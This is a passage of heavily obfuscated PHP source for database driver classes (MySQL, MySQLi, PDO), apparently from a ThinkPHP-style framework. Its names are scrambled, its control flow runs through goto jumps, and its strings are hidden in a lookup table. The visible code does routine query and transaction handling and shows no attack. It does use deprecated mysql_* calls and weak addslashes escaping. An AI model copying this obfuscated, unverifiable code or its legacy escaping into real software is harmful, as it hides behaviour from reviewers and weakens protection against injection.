($f‘öÙİ£¾õ[$Aá‘°Ôç®[846]] ? "\x3a{$f‘öÙİ£¾õ[$Aá‘°Ôç®[846]]}" : $Aá‘°Ôç®[33]); $d£ù£¹ÜáÊ = !empty($f‘öÙİ£¾õ[$Aá‘°Ôç®[13]][$Aá‘°Ôç®[14]]) ? $f‘öÙİ£¾õ[$Aá‘°Ôç®[13]][$Aá‘°Ôç®[14]] : $this->pconnect; goto f‡Ë—âˆßî; E¼ˆ××œµ¥: if (1 != think_config($Aá‘°Ôç®[18])) { unset($this->config); } goto cÏ¢ ÉÈøˆ; b…ƒŠ¦Àñˆ: mysql_query($Aá‘°Ôç®[849] . think_config($Aá‘°Ôç®[850]) . $Aá‘°Ôç®[55], $this->linkID[$AÌÆñÈ†ãŸ]); if ($cÏÆ˜Öë‚– > $Aá‘°Ôç®[851]) { mysql_query($Aá‘°Ôç®[852], $this->linkID[$AÌÆñÈ†ãŸ]); } $this->connected = !0; goto E¼ˆ××œµ¥; f‡Ë—âˆßî: if ($d£ù£¹ÜáÊ) { $this->linkID[$AÌÆñÈ†ãŸ] = mysql_pconnect($b›‘Ğ§ğ´, $f‘öÙİ£¾õ[$Aá‘°Ôç®[847]], $f‘öÙİ£¾õ[$Aá‘°Ôç®[848]], 131072); } else { $this->linkID[$AÌÆñÈ†ãŸ] = mysql_connect($b›‘Ğ§ğ´, $f‘öÙİ£¾õ[$Aá‘°Ôç®[847]], $f‘öÙİ£¾õ[$Aá‘°Ôç®[848]], !0, 131072); } if (!$this->linkID[$AÌÆñÈ†ãŸ] || !empty($f‘öÙİ£¾õ[$Aá‘°Ôç®[17]]) && !mysql_select_db($f‘öÙİ£¾õ[$Aá‘°Ôç®[17]], $this->linkID[$AÌÆñÈ†ãŸ])) { think_exception(mysql_error()); } $cÏÆ˜Öë‚– = mysql_get_server_info($this->linkID[$AÌÆñÈ†ãŸ]); goto b…ƒŠ¦Àñˆ; cÏ¢ ÉÈøˆ: } return $this->linkID[$AÌÆñÈ†ãŸ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E•†»„­¾) { goto e™Åäò¿–Ô; e™Åäò¿–Ô: $a§ˆß—”¯• =& $_SERVER[¬ı§†‰ú˜¼]; if (0 === stripos($E•†»„­¾, $a§ˆß—”¯•[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto C˜·ĞÚŸø; E×Ì÷‰İ¡ƒ: think_action_status($a§ˆß—”¯•[19], 1); think_status($a§ˆß—”¯•[20]); $this->queryID = mysql_query($E•†»„­¾, $this->_linkID); goto Fõ¾éë“ö; C˜·ĞÚŸø: if (!$this->_linkID) { return !1; } $this->queryStr = $E•†»„­¾; if ($this->queryID) { $this->free(); } goto E×Ì÷‰İ¡ƒ; Fõ¾éë“ö: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto E¿ï¶Ñ¯¶; E¿ï¶Ñ¯¶: } public function execute($bÆâ¡ùİî) { goto b’¯­ñ‡Œ; C½êŒ–Ê—‰: think_status($dÆƒÂ¿‘[20]); $Aô·¸…‡‰ = mysql_query($bÆâ¡ùİî, $this->_linkID); $this->debug(); goto B²ãÎ›ï§Æ; B²ãÎ›ï§Æ: if (!1 === $Aô·¸…‡‰) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto c†Â¡Ê¾’¼; c¥ÒÔƒÃô: $this->queryStr = $bÆâ¡ùİî; if ($this->queryID) { $this->free(); } think_action_status($dÆƒÂ¿‘[21], 1); goto C½êŒ–Ê—‰; b’¯­ñ‡Œ: $dÆƒÂ¿‘ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¥ÒÔƒÃô; c†Â¡Ê¾’¼: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¬ı§†‰ú˜¼][853], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A¾åœ ğ = mysql_query($_SERVER[¬ı§†‰ú˜¼][854], $this->_linkID); $this->transTimes = 0; if (!$A¾åœ ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÉ´·ê‚× = mysql_query($_SERVER[¬ı§†‰ú˜¼][855], $this->_linkID); $this->transTimes = 0; if (!$EÉ´·ê‚×) { $this->error(); return !1; } } return !0; } private function getAll() { $BŒ†ÎèÒ = array(); if ($this->numRows > 0) { while ($a‹ÜˆÄê® = mysql_fetch_assoc($this->queryID)) { $BŒ†ÎèÒ[] = $a‹ÜˆÄê®; } mysql_data_seek($this->queryID, 0); } return $BŒ†ÎèÒ; } public function getFields($DøÉ•ª‘„’) { $D„ùù¿òõ… =& $_SERVER[¬ı§†‰ú˜¼]; $Bñ©»Ü›÷… = $this->query($D„ùù¿òõ…[856] . $this->parseKey($DøÉ•ª‘„’)); $dÁ¯¨Â³®Í = array(); if ($Bñ©»Ü›÷…) { foreach ($Bñ©»Ü›÷… as $F´ó²‰Ü÷¡ => $A¿‹Â°åƒ) { $dÁ¯¨Â³®Í[$A¿‹Â°åƒ[$D„ùù¿òõ…[27]]] = array($D„ùù¿òõ…[28] => $A¿‹Â°åƒ[$D„ùù¿òõ…[27]], $D„ùù¿òõ…[29] => $A¿‹Â°åƒ[$D„ùù¿òõ…[30]], $D„ùù¿òõ…[31] => (bool) (strtoupper($A¿‹Â°åƒ[$D„ùù¿òõ…[32]]) === $D„ùù¿òõ…[857]), $D„ùù¿òõ…[34] => $A¿‹Â°åƒ[$D„ùù¿òõ…[35]], $D„ùù¿òõ…[36] => strtolower($A¿‹Â°åƒ[$D„ùù¿òõ…[37]]) == $D„ùù¿òõ…[38], $D„ùù¿òõ…[39] => strtolower($A¿‹Â°åƒ[$D„ùù¿òõ…[40]]) == $D„ùù¿òõ…[41]); } } return $dÁ¯¨Â³®Í; } public function getTables($E½ÙëÒƒä = '') { $FÎ¨¦…àÅØ =& $_SERVER[¬ı§†‰ú˜¼]; if (!empty($E½ÙëÒƒä)) { $Cá‰´Ü›Ë‘ = $FÎ¨¦…àÅØ[858] . $E½ÙëÒƒä . $FÎ¨¦…àÅØ[859]; } else { $Cá‰´Ü›Ë‘ = $FÎ¨¦…àÅØ[860]; } $D¯µé…èêõ = $this->query($Cá‰´Ü›Ë‘); $Fà›ÎËö– = array(); foreach ($D¯µé…èêõ as $F ¶—ÍÆ¼ => $eŒæø–¾´ª) { $Fà›ÎËö–[$F ¶—ÍÆ¼] = current($eŒæø–¾´ª); } return $Fà›ÎËö–; } public function replace($DÈË¶Î¡¢ç, $b‰Ş«óÉ§Ö = array()) { $E¬Ñ´ÀÁÓ¤ =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($DÈË¶Î¡¢ç as $aá¯²ÓóÃ¿ => $d†ùš®¸ë) { $CĞ©µ¡Çƒé = $this->parseValue($d†ùš®¸ë); if (is_scalar($CĞ©µ¡Çƒé)) { $eÁŞîØğÒÚ[] = $CĞ©µ¡Çƒé; $Cå·ò„Ï˜ˆ[] = $this->parseKey($aá¯²ÓóÃ¿); } } $D–ÜÇé£²… = $E¬Ñ´ÀÁÓ¤[861] . $this->parseTable($b‰Ş«óÉ§Ö[$E¬Ñ´ÀÁÓ¤[276]]) . $E¬Ñ´ÀÁÓ¤[862] . implode($E¬Ñ´ÀÁÓ¤[47], $Cå·ò„Ï˜ˆ) . $E¬Ñ´ÀÁÓ¤[863] . implode($E¬Ñ´ÀÁÓ¤[47], $eÁŞîØğÒÚ) . $E¬Ñ´ÀÁÓ¤[864]; return $this->execute($D–ÜÇé£²…); } public function insertAll($Cô‚à•Œ¡‘, $CŸëºË«… = array(), $AêÒ³õµâ = false) { goto d”¢§Û§ÈÚ; f™œªøÊƒ¼: $f¶è¯ÒáÈ = array(); foreach ($Cô‚à•Œ¡‘ as $a•Â¬«•‰¼) { $d–œììÇ³ = array(); foreach ($a•Â¬«•‰¼ as $BŠí“‚˜ù => $b±Ü˜âøç¡) { $b±Ü˜âøç¡ = $this->parseValue($b±Ü˜âøç¡); if (is_scalar($b±Ü˜âøç¡)) { $d–œììÇ³[] = $b±Ü˜âøç¡; } } $f¶è¯ÒáÈ[] = $d§í é”ëÃ[257] . implode($d§í é”ëÃ[47], $d–œììÇ³) . $d§í é”ëÃ[864]; } array_walk($BéÃñ×©Ğİ, array($this, $d§í é”ëÃ[865])); goto B§ô‰ù¶¿; B§ô‰ù¶¿: $F¶ôáÚÆŠ· = ($AêÒ³õµâ ? $d§í é”ëÃ[866] : $d§í é”ëÃ[867]) . $d§í é”ëÃ[868] . $this->parseTable($CŸëºË«…[$d§í é”ëÃ[276]]) . $d§í é”ëÃ[862] . implode($d§í é”ëÃ[47], $BéÃñ×©Ğİ) . $d§í é”ëÃ[869] . implode($d§í é”ëÃ[47], $f¶è¯ÒáÈ); return $this->execute($F¶ôáÚÆŠ·); goto DÃõ³Ø¹Û; d”¢§Û§ÈÚ: $d§í é”ëÃ =& $_SERVER[¬ı§†‰ú˜¼]; if (!is_array($Cô‚à•Œ¡‘[0])) { return !1; } $BéÃñ×©Ğİ = array_keys($Cô‚à•Œ¡‘[0]); goto f™œªøÊƒ¼; DÃõ³Ø¹Û: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $EÛí‹æÑ¾ =& $_SERVER[¬ı§†‰ú˜¼]; $this->error = mysql_errno() . $EÛí‹æÑ¾[4] . mysql_error($this->_linkID); if ($EÛí‹æÑ¾[33] != $this->queryStr) { $this->error .= LNG($EÛí‹æÑ¾[45]) . $this->queryStr; } think_trace($this->error, $EÛí‹æÑ¾[33], $EÛí‹æÑ¾[46]); return $this->error; } public function escapeString($BˆèõÖŒÙË) { if ($this->_linkID) { return mysql_real_escape_string($BˆèõÖŒÙË, $this->_linkID); } else { return mysql_escape_string($BˆèõÖŒÙË); } } public function parseKey(&$eÔˆ©çœé­, $B¯ªä—Ã¨œ = true) { $a†ÎÅ‘Öñ =& $_SERVER[¬ı§†‰ú˜¼]; if ($B¯ªä—Ã¨œ) { $eÔˆ©çœé­ = $this->parseKeyCheck($eÔˆ©çœé­); } if ($eÔˆ©çœé­ != $a†ÎÅ‘Öñ[182] && !preg_match($a†ÎÅ‘Öñ[870], $eÔˆ©çœé­)) { $eÔˆ©çœé­ = $a†ÎÅ‘Öñ[381] . trim($eÔˆ©çœé­, $a†ÎÅ‘Öñ[381]) . $a†ÎÅ‘Öñ[381]; } return $eÔˆ©çœé­; } } class DbMysqli extends Db { public function __construct($AÈä¾†à¼Š = '') { $C Ú‚½Éª =& $_SERVER[¬ı§†‰ú˜¼]; if (!extension_loaded($C Ú‚½Éª[759])) { think_exception(think_lang($C Ú‚½Éª[10]) . $C Ú‚½Éª[871]); } if (!empty($AÈä¾†à¼Š)) { $this->config = $AÈä¾†à¼Š; if (empty($this->config[$C Ú‚½Éª[13]])) { $this->config[$C Ú‚½Éª[13]] = $C Ú‚½Éª[33]; } } } public function connect($e½´ÉÜÓº± = '', $C¹Êö‰Ÿ± = 0) { $E…¸İïŠª™ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->linkID[$C¹Êö‰Ÿ±])) { goto eì›ö”Õ±å; eì›ö”Õ±å: if (empty($e½´ÉÜÓº±)) { $e½´ÉÜÓº± = $this->config; } $this->linkID[$C¹Êö‰Ÿ±] = new mysqli($e½´ÉÜÓº±[$E…¸İïŠª™[845]], $e½´ÉÜÓº±[$E…¸İïŠª™[847]], $e½´ÉÜÓº±[$E…¸İïŠª™[848]], $e½´ÉÜÓº±[$E…¸İïŠª™[17]], $e½´ÉÜÓº±[$E…¸İïŠª™[846]] ? intval($e½´ÉÜÓº±[$E…¸İïŠª™[846]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto dñÒø­Îï; aÁéõ¾ƒó: $this->connected = !0; if (1 != think_config($E…¸İïŠª™[18])) { unset($this->config); } goto D…»š¢Šš; dñÒø­Îï: $B¸º­åÀµõ = $this->linkID[$C¹Êö‰Ÿ±]->server_version; $this->linkID[$C¹Êö‰Ÿ±]->query($E…¸İïŠª™[849] . think_config($E…¸İïŠª™[850]) . $E…¸İïŠª™[55]); if ($B¸º­åÀµõ > $E…¸İïŠª™[851]) { $this->linkID[$C¹Êö‰Ÿ±]->query($E…¸İïŠª™[852]); } goto aÁéõ¾ƒó; D…»š¢Šš: } return $this->linkID[$C¹Êö‰Ÿ±]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Aá¬‚‹¥î¬) { goto E˜¾öˆ¶’Â; B´ƒµÏùÁ: $this->queryStr = $Aá¬‚‹¥î¬; if ($this->queryID) { $this->free(); } think_action_status($Bß¤Ó¤‹ˆÔ[19], 1); goto f–Ò‹‰À½ˆ; E˜¾öˆ¶’Â: $Bß¤Ó¤‹ˆÔ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B´ƒµÏùÁ; f–Ò‹‰À½ˆ: think_status($Bß¤Ó¤‹ˆÔ[20]); $this->queryID = $this->_linkID->query($Aá¬‚‹¥î¬); if ($this->_linkID->more_results()) { while (($D§İƒ¶ù¡¿ = $this->_linkID->next_result()) != NULL) { $D§İƒ¶ù¡¿->free_result(); } } goto BÆ‰óªß²°; BÆ‰óªß²°: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Cª©¸ÃÃ„•; Cª©¸ÃÃ„•: } public function execute($eË†Ó‚¥àò) { goto B³ŸàñËïŸ; B³ŸàñËïŸ: $Eïƒˆà‡‚° =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eàö‹èİ’Á; eàö‹èİ’Á: $this->queryStr = $eË†Ó‚¥àò; if ($this->queryID) { $this->free(); } think_action_status($Eïƒˆà‡‚°[21], 1); goto aöèÅ¥÷–; aöèÅ¥÷–: think_status($Eïƒˆà‡‚°[20]); $aÂÆñ›÷‡‘ = $this->_linkID->query($eË†Ó‚¥àò); $this->debug(); goto A°ÎÊùÛ©; A°ÎÊùÛ©: if (!1 === $aÂÆñ›÷‡‘) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto CˆğãõÄÛò; CˆğãõÄÛò: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cò´µõ« = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Cò´µõ«) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÒª¾ºäÏ¬ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$cÒª¾ºäÏ¬) { $this->error(); return !1; } } return !0; } private function getAll() { $dÎ ÁÅ‰“ = array(); if ($this->numRows > 0) { for ($e¶ÄµÄ‘‘© = 0; $e¶ÄµÄ‘‘© < $this->numRows; $e¶ÄµÄ‘‘©++) { $dÎ ÁÅ‰“[$e¶ÄµÄ‘‘©] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dÎ ÁÅ‰“; } public function getFields($cÅá©ĞØİ) { $C‡Òôšå•— =& $_SERVER[¬ı§†‰ú˜¼]; $BÂä»„Èä  = $this->query($C‡Òôšå•—[856] . $this->parseKey($cÅá©ĞØİ)); $AÄÖŒùÒÉª = array(); if ($BÂä»„Èä ) { foreach ($BÂä»„Èä  as $eÜö˜à®‘½ => $Fë¤«ƒƒá) { $AÄÖŒùÒÉª[$Fë¤«ƒƒá[$C‡Òôšå•—[27]]] = array($C‡Òôšå•—[28] => $Fë¤«ƒƒá[$C‡Òôšå•—[27]], $C‡Òôšå•—[29] => $Fë¤«ƒƒá[$C‡Òôšå•—[30]], $C‡Òôšå•—[31] => (bool) ($Fë¤«ƒƒá[$C‡Òôšå•—[32]] === $C‡Òôšå•—[33]), $C‡Òôšå•—[34] => $Fë¤«ƒƒá[$C‡Òôšå•—[35]], $C‡Òôšå•—[36] => strtolower($Fë¤«ƒƒá[$C‡Òôšå•—[37]]) == $C‡Òôšå•—[38], $C‡Òôšå•—[39] => strtolower($Fë¤«ƒƒá[$C‡Òôšå•—[40]]) == $C‡Òôšå•—[41]); } } return $AÄÖŒùÒÉª; } public function getTables($Aµ¤Ëé”š¡ = '') { $d¦©‡¶µÎŠ =& $_SERVER[¬ı§†‰ú˜¼]; $cŞçæ¸ê´³ = !empty($Aµ¤Ëé”š¡) ? $d¦©‡¶µÎŠ[858] . $Aµ¤Ëé”š¡ . $d¦©‡¶µÎŠ[859] : $d¦©‡¶µÎŠ[860]; $C’‡Ã§ªÇõ = $this->query($cŞçæ¸ê´³); $b½§ù‹“Ò = array(); if ($C’‡Ã§ªÇõ) { foreach ($C’‡Ã§ªÇõ as $a•ÎëÓø°¹ => $fÎØª•¡÷) { $b½§ù‹“Ò[$a•ÎëÓø°¹] = current($fÎØª•¡÷); } } return $b½§ù‹“Ò; } public function replace($e•¸ÛÆÀ‡§, $eÅá—êÜè” = array()) { $d¼âÔñË°Á =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($e•¸ÛÆÀ‡§ as $F¨ğÕí¡ÜØ => $cî×ñ¾«¤) { $Ağ†¨š–†Õ = $this->parseValue($cî×ñ¾«¤); if (is_scalar($Ağ†¨š–†Õ)) { $E…íáŠƒ‹³[] = $Ağ†¨š–†Õ; $e¢±Ğòºƒ[] = $this->parseKey($F¨ğÕí¡ÜØ); } } $B·ğğí†Õ” = $d¼âÔñË°Á[861] . $this->parseTable($eÅá—êÜè”[$d¼âÔñË°Á[276]]) . $d¼âÔñË°Á[862] . implode($d¼âÔñË°Á[47], $e¢±Ğòºƒ) . $d¼âÔñË°Á[863] . implode($d¼âÔñË°Á[47], $E…íáŠƒ‹³) . $d¼âÔñË°Á[864]; return $this->execute($B·ğğí†Õ”); } public function insertAll($Aò‚Á£‰ò´, $C¦í–ÏÖ°ğ = array(), $C³âä°ï¦ = false) { goto fÒã šè»; fÒã šè»: $bŠãÛìÔË¹ =& $_SERVER[¬ı§†‰ú˜¼]; if (!is_array($Aò‚Á£‰ò´[0])) { return !1; } $Eˆóº¡¡ñ = array_keys($Aò‚Á£‰ò´[0]); goto bæ“‚µë£ó; e¡…Ï—«øŸ: $eËº¥­ù®ª = $C³âä°ï¦ ? $bŠãÛìÔË¹[866] : $bŠãÛìÔË¹[867]; $DåØë¹’œ« = $eËº¥­ù®ª . $bŠãÛìÔË¹[868] . $this->parseTable($C¦í–ÏÖ°ğ[$bŠãÛìÔË¹[276]]) . $bŠãÛìÔË¹[862] . implode($bŠãÛìÔË¹[47], $Eˆóº¡¡ñ) . $bŠãÛìÔË¹[869] . implode($bŠãÛìÔË¹[47], $bÙ’¸Ê¢ø); return $this->execute($DåØë¹’œ«); goto Cˆ°æ÷„Ù; bæ“‚µë£ó: $bÙ’¸Ê¢ø = array(); foreach ($Aò‚Á£‰ò´ as $B·§ÚÂ¯¸²) { $fÀ¬èÉÀ¨ = array(); foreach ($B·§ÚÂ¯¸² as $B™¿„Á²ßš => $dî‘í§æ‘) { $dî‘í§æ‘ = $this->parseValue($dî‘í§æ‘); if (is_scalar($dî‘í§æ‘)) { $fÀ¬èÉÀ¨[] = $dî‘í§æ‘; } } $bÙ’¸Ê¢ø[] = $bŠãÛìÔË¹[257] . implode($bŠãÛìÔË¹[47], $fÀ¬èÉÀ¨) . $bŠãÛìÔË¹[864]; } array_walk($Eˆóº¡¡ñ, array($this, $bŠãÛìÔË¹[865])); goto e¡…Ï—«øŸ; Cˆ°æ÷„Ù: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $f‘ùèíĞÆ =& $_SERVER[¬ı§†‰ú˜¼]; $this->error = $this->_linkID->errno . $f‘ùèíĞÆ[4] . $this->_linkID->error; if ($f‘ùèíĞÆ[33] != $this->queryStr) { $this->error .= LNG($f‘ùèíĞÆ[45]) . $this->queryStr; } think_trace($this->error, $f‘ùèíĞÆ[33], $f‘ùèíĞÆ[46]); return $this->error; } public function escapeString($F‚Óõ‹¾É°) { if ($this->_linkID) { return $this->_linkID->real_escape_string($F‚Óõ‹¾É°); } else { return addslashes($F‚Óõ‹¾É°); } } public function parseKey(&$føó‘â®‚, $DŞÉ‡¡¢»î = true) { $CÈ‘â½Öƒï =& $_SERVER[¬ı§†‰ú˜¼]; if ($DŞÉ‡¡¢»î) { $føó‘â®‚ = $this->parseKeyCheck($føó‘â®‚); } if ($føó‘â®‚ != $CÈ‘â½Öƒï[182] && !preg_match($CÈ‘â½Öƒï[870], $føó‘â®‚)) { $føó‘â®‚ = $CÈ‘â½Öƒï[381] . trim($føó‘â®‚, $CÈ‘â½Öƒï[381]) . $CÈ‘â½Öƒï[381]; } return $føó‘â®‚; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($cìÅòù›¤ = '') { $b¨Òø£Ô‚š =& $_SERVER[¬ı§†‰ú˜¼]; if (!class_exists($b¨Òø£Ô‚š[872])) { think_exception(think_lang($b¨Òø£Ô‚š[10]) . $b¨Òø£Ô‚š[873]); } if (!empty($cìÅòù›¤)) { $this->config = $cìÅòù›¤; if (empty($this->config[$b¨Òø£Ô‚š[13]])) { $this->config[$b¨Òø£Ô‚š[13]] = array(); } } } public function connect($C¨ÁÂÏ…ƒ™ = '', $a·êÑğêß = 0) { $DŞ„¸ŠŠÜ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->linkID[$a·êÑğêß])) { goto A³ƒ–„™â; A³ƒ–„™â: if (empty($C¨ÁÂÏ…ƒ™)) { $C¨ÁÂÏ…ƒ™ = $this->config; } $cè« ë´ = !empty($C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[13]][$DŞ„¸ŠŠÜ[14]]) ? $C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[13]][$DŞ„¸ŠŠÜ[14]] : $this->pconnect; if ($cè« ë´) { $C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[13]][PDO::ATTR_PERSISTENT] = !0; } goto C¹ë’‡µÛ¨; FÙ¥µ·œ‚º: if (1 != think_config($DŞ„¸ŠŠÜ[18])) { unset($this->config); } goto B’¸öòÏ•Ò; C¹ë’‡µÛ¨: try { $this->linkID[$a·êÑğêß] = new PDO($C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[874]], $C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[847]], $C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[848]], $C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[13]]); } catch (PDOException $aøéÊïÕ¢) { think_exception($aøéÊïÕ¢->getMessage()); } $this->dbType = $this->_getDsnType($C¨ÁÂÏ…ƒ™[$DŞ„¸ŠŠÜ[874]]); if (in_array($this->dbType, array($DŞ„¸ŠŠÜ[875], $DŞ„¸ŠŠÜ[876], $DŞ„¸ŠŠÜ[877], $DŞ„¸ŠŠÜ[878]))) { think_exception($DŞ„¸ŠŠÜ[879] . $this->dbType . $DŞ„¸ŠŠÜ[880] . $this->dbType . $DŞ„¸ŠŠÜ[881]); } goto dä¤Ş™²Ã«; dä¤Ş™²Ã«: if (!$this->linkID[$a·êÑğêß]) { think_exception($DŞ„¸ŠŠÜ[882]); } try { $this->linkID[$a·êÑğêß]->exec($DŞ„¸ŠŠÜ[883] . think_config($DŞ„¸ŠŠÜ[850])); } catch (Exception $aøéÊïÕ¢) { } $this->connected = !0; goto FÙ¥µ·œ‚º; B’¸öòÏ•Ò: } return $this->linkID[$a·êÑğêß]; } public function free() { $this->PDOStatement = null; } public function query($e“¡¿ğñö, $B³²íÒƒè = array()) { goto D¶ô•×å‹‘; Bìàİİ·Ê: if (!1 === $b’®ÚîÍ§‡) { $this->error(); return !1; } else { return $this->getAll(); } goto FÌºÎÃŒáê; cˆŠó›¦ÖË: think_action_status($f„ïàÑîé[19], 1); think_status($f„ïàÑîé[20]); $this->PDOStatement = $this->_linkID->prepare($e“¡¿ğñö); goto D¡ïÛ·ÌÔ; D¶ô•×å‹‘: $f„ïàÑîé =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÄÆÕİ­§¯; D¡ïÛ·ÌÔ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b’®ÚîÍ§‡ = $this->PDOStatement->execute($B³²íÒƒè); $this->debug(); goto Bìàİİ·Ê; CÄÆÕİ­§¯: $this->queryStr = $e“¡¿ğñö; if (!empty($B³²íÒƒè)) { $this->queryStr .= $f„ïàÑîé[884] . print_r($B³²íÒƒè, !0) . $f„ïàÑîé[885]; } if (!empty($this->PDOStatement)) { $this->free(); } goto cˆŠó›¦ÖË; FÌºÎÃŒáê: } public function execute($E¤¥õå“Õì, $b‚‡¦›ììŸ = array()) { goto föÁµ¯Åğà; dØó£ë’¡: $this->queryStr = $E¤¥õå“Õì; if (!empty($b‚‡¦›ììŸ)) { $this->queryStr .= $D”èÂÏ±‚¿[884] . print_r($b‚‡¦›ììŸ, !0) . $D”èÂÏ±‚¿[885]; } $eÎÍ¡¢İÔÎ = !1; goto FåÄòä’; eØ›ë¤ê’£: $fô¨‡”¶— = $this->PDOStatement->execute($b‚‡¦›ììŸ); $this->debug(); if (!1 === $fô¨‡”¶—) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($eÎÍ¡¢İÔÎ || preg_match($D”èÂÏ±‚¿[890], $E¤¥õå“Õì)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto D‚Å¿êñ½; föÁµ¯Åğà: $D”èÂÏ±‚¿ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dØó£ë’¡; aÍÑÁÎÁ£š: think_status($D”èÂÏ±‚¿[20]); $this->PDOStatement = $this->_linkID->prepare($E¤¥õå“Õì); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto eØ›ë¤ê’£; FåÄòä’: if ($this->dbType == $D”èÂÏ±‚¿[878]) { if (preg_match($D”èÂÏ±‚¿[886], $this->queryStr, $E‡µŞà±Üñ)) { $this->table = think_config($D”èÂÏ±‚¿[887]) . str_ireplace(think_config($D”èÂÏ±‚¿[888]), $D”èÂÏ±‚¿[374], $E‡µŞà±Üñ[2]); $eÎÍ¡¢İÔÎ = (bool) $this->query($D”èÂÏ±‚¿[889] . strtoupper($this->table) . $D”èÂÏ±‚¿[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($D”èÂÏ±‚¿[21], 1); goto aÍÑÁÎÁ£š; D‚Å¿êñ½: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d…Ùâ–èšö = $this->_linkID->commit(); $this->transTimes = 0; if (!$d…Ùâ–èšö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D„Œ¡µõ‘İ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D„Œ¡µõ‘İ) { $this->error(); return !1; } } return !0; } private function getAll() { $EÑ¬ß±ò¾– = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($EÑ¬ß±ò¾–); return $EÑ¬ß±ò¾–; } public function getFields($Cğ¸åŞÜ’¾) { goto dšßÚ¬œÒ¢; dšßÚ¬œÒ¢: $f¤æ‡¬‚°ê =& $_SERVER[¬ı§†‰ú˜¼]; $this->initConnect(!0); if (think_config($f¤æ‡¬‚°ê[891])) { $aÌ¿ÇÚ”° = str_replace($f¤æ‡¬‚°ê[892], $Cğ¸åŞÜ’¾, think_config($f¤æ‡¬‚°ê[891])); } else { switch ($this->dbType) { case $f¤æ‡¬‚°ê[875]: case $f¤æ‡¬‚°ê[893]: $aÌ¿ÇÚ”° = "\123\x45\114\x45\x43\x54\40\x20\x20\143\157\x6c\165\155\x6e\x5f\156\x61\155\145\x20\x61\163\x20\x27\x4e\141\155\x65\x27\x2c\40\40\40\144\x61\x74\141\137\164\171\x70\145\40\141\x73\40\x27\x54\171\160\x65\47\54\40\40\40\x63\x6f\x6c\x75\155\x6e\x5f\x64\145\146\x61\x75\154\164\x20\x61\x73\x20\47\104\145\146\x61\165\154\164\x27\54\x20\40\40\151\x73\137\156\165\154\x6c\141\142\x6c\x65\40\x61\x73\x20\x27\116\x75\x6c\154\47\xa\11\11\x46\x52\x4f\x4d\11\151\x6e\x66\157\162\x6d\141\x74\x69\x6f\156\x5f\x73\x63\x68\x65\x6d\141\x2e\x74\141\x62\154\x65\x73\40\x41\123\x20\x74\12\x9\x9\x4a\x4f\111\x4e\x9\x69\156\x66\157\162\155\x61\x74\151\157\x6e\137\163\143\x68\x65\155\x61\x2e\x63\157\x6c\x75\x6d\156\163\40\x41\123\x20\x63\xa\x9\11\117\x4e\40\40\x74\x2e\164\x61\x62\154\145\137\143\141\x74\141\154\x6f\x67\40\x3d\40\x63\x2e\x74\x61\142\154\x65\137\x63\141\164\141\x6c\x6f\x67\12\11\x9\x41\116\104\x20\164\x2e\x74\141\142\x6c\145\137\x73\x63\x68\x65\x6d\141\40\75\40\x63\x2e\164\x61\x62\154\x65\137\163\143\150\145\155\x61\